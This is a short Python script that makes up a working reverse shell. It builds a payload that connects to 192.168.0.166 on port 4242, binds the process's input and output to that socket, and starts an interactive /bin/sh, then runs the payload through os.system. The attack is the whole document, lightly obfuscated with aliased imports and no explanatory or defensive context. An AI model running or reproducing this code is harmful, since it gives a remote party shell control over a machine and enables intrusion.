import os
payload = ('a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("192.168.0.166",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])')
os.system("python3 -c '%s'" % payload)